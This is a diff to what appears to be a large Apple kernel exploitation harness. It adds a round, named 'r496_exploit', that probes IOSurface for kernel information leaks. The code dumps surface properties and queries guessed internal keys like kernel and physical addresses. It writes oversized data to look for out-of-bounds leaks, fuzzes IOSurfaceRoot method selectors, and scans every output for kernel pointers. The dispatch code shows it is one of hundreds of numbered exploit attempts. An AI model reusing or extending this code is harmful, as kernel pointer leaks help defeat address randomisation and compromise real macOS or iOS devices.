@@ -26249,6 +26249,318 @@ r495_done:
     fflush(stdout);
 }
 
+/* ============================================================
+ * r496: IOSurface property roundtrip + mixed IOConnectCallMethod
+ *
+ * IOSurfaceCopyAllValues returns all properties of a surface
+ * including potentially kernel-internal ones.
+ * IOSurfaceSetValue/CopyValue roundtrip through the kernel.
+ * Also try IOConnectCallMethod with mixed scalar+struct input.
+ * ============================================================ */
+
+static void r496_exploit(void) {
+    rlog("\n=== r496: IOSurface property roundtrip + mixed methods ===\n\n");
+    fflush(stdout);
+
+    /* Create test surface */
+    CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(
+        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpr = 256, bpe = 4, pf = 0x42475241;
+    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
+    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
+    CFNumberRef nbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr);
+    CFNumberRef nbpe = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe);
+    CFNumberRef npf = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pf);
+    CFDictionarySetValue(sprops, kIOSurfaceWidth, nw);
+    CFDictionarySetValue(sprops, kIOSurfaceHeight, nh);
+    CFDictionarySetValue(sprops, kIOSurfaceBytesPerRow, nbpr);
+    CFDictionarySetValue(sprops, kIOSurfaceBytesPerElement, nbpe);
+    CFDictionarySetValue(sprops, kIOSurfacePixelFormat, npf);
+    int allocsz = 64 * 256;
+    CFNumberRef nas = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &allocsz);
+    CFDictionarySetValue(sprops, kIOSurfaceAllocSize, nas);
+    CFRelease(nw); CFRelease(nh); CFRelease(nbpr);
+    CFRelease(nbpe); CFRelease(npf); CFRelease(nas);
+
+    IOSurfaceRef surf = IOSurfaceCreate(sprops);
+    CFRelease(sprops);
+    if (!surf) { rlog("  Failed to create surface\n"); goto r496_done; }
+
+    uint32_t sid = IOSurfaceGetID(surf);
+    rlog("  Surface ID=%u\n", sid);
+
+    /* Part 1: IOSurfaceCopyAllValues — get ALL properties */
+    rlog("\n--- Part 1: IOSurfaceCopyAllValues ---\n");
+    {
+        CFDictionaryRef allvals = IOSurfaceCopyAllValues(surf);
+        if (allvals) {
+            CFIndex n = CFDictionaryGetCount(allvals);
+            rlog("  AllValues: %ld properties\n", (long)n);
+            const void **keys = malloc(sizeof(void*) * n);
+            const void **vals = malloc(sizeof(void*) * n);
+            CFDictionaryGetKeysAndValues(allvals, keys, vals);
+            for (CFIndex i = 0; i < n && i < 50; i++) {
+                char kbuf[256] = {0};
+                if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+                    CFStringGetCString(keys[i], kbuf, 256, kCFStringEncodingUTF8);
+
+                CFTypeRef v = vals[i];
+                if (CFGetTypeID(v) == CFNumberGetTypeID()) {
+                    int64_t nv = 0;
+                    CFNumberGetValue(v, kCFNumberSInt64Type, &nv);
+                    rlog("  %s = %lld (0x%llx)\n", kbuf, (long long)nv,
+                         (unsigned long long)(uint64_t)nv);
+                    if (((uint64_t)nv >> 36) == 0xfffffff ||
+                        ((uint64_t)nv >> 36) == 0xfffffffe)
+                        rlog("    *** KPTR ***\n");
+                } else if (CFGetTypeID(v) == CFBooleanGetTypeID()) {
+                    rlog("  %s = %s\n", kbuf,
+                         CFBooleanGetValue(v) ? "true" : "false");
+                } else if (CFGetTypeID(v) == CFStringGetTypeID()) {
+                    char vbuf[256] = {0};
+                    CFStringGetCString(v, vbuf, 256, kCFStringEncodingUTF8);
+                    rlog("  %s = \"%s\"\n", kbuf, vbuf);
+                } else if (CFGetTypeID(v) == CFDataGetTypeID()) {
+                    CFIndex dlen = CFDataGetLength(v);
+                    const UInt8 *d = CFDataGetBytePtr(v);
+                    rlog("  %s = data[%ld]:", kbuf, (long)dlen);
+                    for (CFIndex j = 0; j < dlen && j < 32; j++)
+                        rlog(" %02x", d[j]);
+                    rlog("\n");
+                    for (CFIndex j = 0; j + 7 < dlen; j += 8) {
+                        uint64_t pv;
+                        memcpy(&pv, d + j, 8);
+                        if ((pv >> 36) == 0xfffffff || (pv >> 36) == 0xfffffffe)
+                            rlog("    *** KPTR at %ld: 0x%llx ***\n",
+                                 (long)j, (unsigned long long)pv);
+                    }
+                } else if (CFGetTypeID(v) == CFDictionaryGetTypeID()) {
+                    rlog("  %s = dict[%ld]\n", kbuf,
+                         (long)CFDictionaryGetCount(v));
+                } else {
+                    rlog("  %s = <type %lu>\n", kbuf,
+                         (unsigned long)CFGetTypeID(v));
+                }
+            }
+            free(keys);
+            free(vals);
+            CFRelease(allvals);
+        } else {
+            rlog("  AllValues returned NULL\n");
+        }
+    }
+    fflush(stdout);
+
+    /* Part 2: Try reading internal property keys */
+    rlog("\n--- Part 2: Internal property key probes ---\n");
+    {
+        const char *probe_keys[] = {
+            "IOSurfaceAddress", "IOSurfaceKernelAddress",
+            "IOSurfacePhysicalAddress", "IOSurfaceRegistryID",
+            "IOSurfaceClientAddress", "IOSurfaceGlobalID",
+            "IOSurfaceMachPort", "IOSurfaceIsGlobal",
+            "IOSurfaceIsPurgeable", "IOSurfacePurgeWhenNotInUse",
+            "IOSurfaceCacheMode", "IOSurfaceOffset",
+            "IOSurfacePlaneBytesPerRow", "IOSurfaceElementWidth",
+            "IOSurfaceElementHeight", "IOSurfaceSubsampling",
+            "IOSurfaceName", "IOSurfaceCreatorPID",
+            "SurfaceSlotID", "SurfaceIsCompressed",
+            "SurfaceAllocationMode", "IOSurfacePAC",
+        };
+        for (int k = 0; k < 22; k++) {
+            CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault,
+                probe_keys[k], kCFStringEncodingUTF8);
+            CFTypeRef val = IOSurfaceCopyValue(surf, key);
+            if (val) {
+                if (CFGetTypeID(val) == CFNumberGetTypeID()) {
+                    int64_t nv = 0;
+                    CFNumberGetValue(val, kCFNumberSInt64Type, &nv);
+                    rlog("  %s = %lld (0x%llx)", probe_keys[k],
+                         (long long)nv, (unsigned long long)(uint64_t)nv);
+                    if (((uint64_t)nv >> 36) == 0xfffffff ||
+                        ((uint64_t)nv >> 36) == 0xfffffffe)
+                        rlog(" ***KPTR***");
+                    rlog("\n");
+                } else if (CFGetTypeID(val) == CFStringGetTypeID()) {
+                    char vbuf[256] = {0};
+                    CFStringGetCString(val, vbuf, 256, kCFStringEncodingUTF8);
+                    rlog("  %s = \"%s\"\n", probe_keys[k], vbuf);
+                } else if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                    CFIndex dlen = CFDataGetLength(val);
+                    rlog("  %s = data[%ld]\n", probe_keys[k], (long)dlen);
+                } else {
+                    rlog("  %s = <type %lu>\n", probe_keys[k],
+                         (unsigned long)CFGetTypeID(val));
+                }
+                CFRelease(val);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* Part 3: Set a value and read it back — check for added fields */
+    rlog("\n--- Part 3: Set/Copy value roundtrip ---\n");
+    {
+        /* Set a custom value */
+        int testval = 0xDEADBEEF;
+        CFNumberRef tv = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &testval);
+        IOSurfaceSetValue(surf, CFSTR("TestKey"), tv);
+        CFRelease(tv);
+
+        /* Read it back */
+        CFTypeRef rv = IOSurfaceCopyValue(surf, CFSTR("TestKey"));
+        if (rv) {
+            int64_t nv = 0;
+            CFNumberGetValue(rv, kCFNumberSInt64Type, &nv);
+            rlog("  TestKey roundtrip: 0x%llx\n", (unsigned long long)(uint64_t)nv);
+            CFRelease(rv);
+        }
+
+        /* Set large data value and check for OOB in response */
+        uint8_t bigdata[4096];
+        memset(bigdata, 0x41, sizeof(bigdata));
+        CFDataRef bd = CFDataCreate(kCFAllocatorDefault, bigdata, sizeof(bigdata));
+        IOSurfaceSetValue(surf, CFSTR("BigData"), bd);
+        CFRelease(bd);
+
+        CFTypeRef bdr = IOSurfaceCopyValue(surf, CFSTR("BigData"));
+        if (bdr && CFGetTypeID(bdr) == CFDataGetTypeID()) {
+            CFIndex dlen = CFDataGetLength(bdr);
+            rlog("  BigData roundtrip: len=%ld\n", (long)dlen);
+            /* Check if any extra data leaked */
+            const UInt8 *d = CFDataGetBytePtr(bdr);
+            int non41 = 0;
+            for (CFIndex j = 0; j < dlen; j++) {
+                if (d[j] != 0x41) { non41++; break; }
+            }
+            rlog("  All 0x41: %s\n", non41 ? "NO — leaked data!" : "yes");
+            if (non41) {
+                rlog("  First divergence at byte ");
+                for (CFIndex j = 0; j < dlen; j++) {
+                    if (d[j] != 0x41) {
+                        rlog("%ld: 0x%02x\n", (long)j, d[j]);
+                        break;
+                    }
+                }
+            }
+            CFRelease(bdr);
+        }
+    }
+    fflush(stdout);
+
+    /* Part 4: IOConnectCallMethod with mixed scalar+struct */
+    rlog("\n--- Part 4: Mixed IOConnectCallMethod ---\n");
+    {
+        CFMutableDictionaryRef match = IOServiceMatching("IOSurfaceRoot");
+        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, match);
+        if (svc) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+            IOObjectRelease(svc);
+            if (kr == KERN_SUCCESS && conn) {
+                /* Try selectors with mixed input: scalar=surfID, struct=empty */
+                for (uint32_t sel = 0; sel < 40; sel++) {
+                    uint64_t sin[2] = {sid, 0};
+                    uint64_t sout[8] = {0};
+                    uint32_t socnt = 8;
+                    uint8_t strout[256] = {0};
+                    size_t stroutlen = 256;
+
+                    /* scalar in + scalar out + struct out */
+                    kr = IOConnectCallMethod(conn, sel,
+                        sin, 1,    /* scalar input */
+                        NULL, 0,   /* struct input */
+                        sout, &socnt, /* scalar output */
+                        strout, &stroutlen); /* struct output */
+                    if (kr != 0xe00002c2 && kr != 0xe00002bc &&
+                        (socnt > 0 || stroutlen > 0)) {
+                        rlog("  sel=%u mixed(1s,0st): kr=0x%x so=%u sto=%zu\n",
+                             sel, kr, socnt, stroutlen);
+                        for (uint32_t j = 0; j < socnt && j < 4; j++) {
+                            rlog("    s[%u]=0x%llx", j, (unsigned long long)sout[j]);
+                            if ((sout[j] >> 36) == 0xfffffff) rlog(" ***KPTR***");
+                            rlog("\n");
+                        }
+                        if (stroutlen > 0) {
+                            rlog("    struct:");
+                            for (size_t j = 0; j < stroutlen && j < 48; j++)
+                                rlog(" %02x", strout[j]);
+                            rlog("\n");
+                        }
+                    }
+
+                    /* Serialized dict as struct input (how IOSurface really works) */
+                    /* Create a simple plist with the surface ID */
+                    CFMutableDictionaryRef sd = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    int sidint = sid;
+                    CFNumberRef nsid = CFNumberCreate(kCFAllocatorDefault,
+                        kCFNumberIntType, &sidint);
+                    CFDictionarySetValue(sd, CFSTR("IOSurfaceID"), nsid);
+                    CFRelease(nsid);
+
+                    CFDataRef pdata = CFPropertyListCreateData(kCFAllocatorDefault,
+                        sd, kCFPropertyListBinaryPlistV1_0, 0, NULL);
+                    CFRelease(sd);
+
+                    if (pdata) {
+                        const UInt8 *praw = CFDataGetBytePtr(pdata);
+                        CFIndex plen = CFDataGetLength(pdata);
+
+                        memset(strout, 0, sizeof(strout));
+                        stroutlen = 256;
+                        socnt = 8;
+                        memset(sout, 0, sizeof(sout));
+
+                        kr = IOConnectCallMethod(conn, sel,
+                            NULL, 0,
+                            praw, plen,
+                            sout, &socnt,
+                            strout, &stroutlen);
+                        if (kr != 0xe00002c2 && kr != 0xe00002bc &&
+                            (socnt > 0 || stroutlen > 0)) {
+                            rlog("  sel=%u plist: kr=0x%x so=%u sto=%zu\n",
+                                 sel, kr, socnt, stroutlen);
+                            for (uint32_t j = 0; j < socnt && j < 4; j++) {
+                                rlog("    s[%u]=0x%llx", j, (unsigned long long)sout[j]);
+                                if ((sout[j] >> 36) == 0xfffffff) rlog(" ***KPTR***");
+                                rlog("\n");
+                            }
+                            if (stroutlen > 0) {
+                                rlog("    struct:");
+                                for (size_t j = 0; j < stroutlen && j < 64; j++)
+                                    rlog(" %02x", strout[j]);
+                                rlog("\n");
+                                /* Scan for kptrs */
+                                for (size_t j = 0; j + 7 < stroutlen; j += 8) {
+                                    uint64_t v;
+                                    memcpy(&v, strout + j, 8);
+                                    if ((v >> 36) == 0xfffffff ||
+                                        (v >> 36) == 0xfffffffe) {
+                                        rlog("    *** KPTR at %zu: 0x%llx ***\n",
+                                             j, (unsigned long long)v);
+                                    }
+                                }
+                            }
+                        }
+                        CFRelease(pdata);
+                    }
+                }
+                IOServiceClose(conn);
+            }
+        }
+    }
+    fflush(stdout);
+
+    CFRelease(surf);
+
+r496_done:
+    rlog("\n=== r496 complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -96326,6 +96638,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 500) {
+            rlog("*** rounds=500: IOSurface property roundtrip + mixed methods ***\n\n");
+            fflush(stdout);
+            r496_exploit();
+            goto done;
+        }
         if (rounds == 499) {
             rlog("*** rounds=499: IOSurfaceRoot methods + mach port leak ***\n\n");
             fflush(stdout);
@@ -99329,7 +99647,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
